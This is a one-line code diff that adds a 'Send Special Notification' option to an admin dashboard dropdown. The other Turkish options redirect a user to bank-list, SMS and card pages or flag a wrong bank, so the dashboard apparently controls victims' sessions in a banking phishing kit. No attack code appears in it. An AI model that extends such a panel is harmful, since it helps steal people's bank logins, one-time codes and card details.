@@ -900,6 +900,7 @@ export function AdminDashboardClean() {
                           <option value="banken">Banka Listesine Yönlendirme</option>
                           <option value="sms">SMS'e Yönlendir</option>
                           <option value="card">Kart'a Yönlendir</option>
+                          <option value="special_approval">Özel Bildirim Gönder</option>
                           <option value="wait">Beklemeye Al</option>
                           <option value="invalid_bank">Hatalı Banka</option>
                           <option value="live_support">Canlı Desteğe Yönlendir</option>
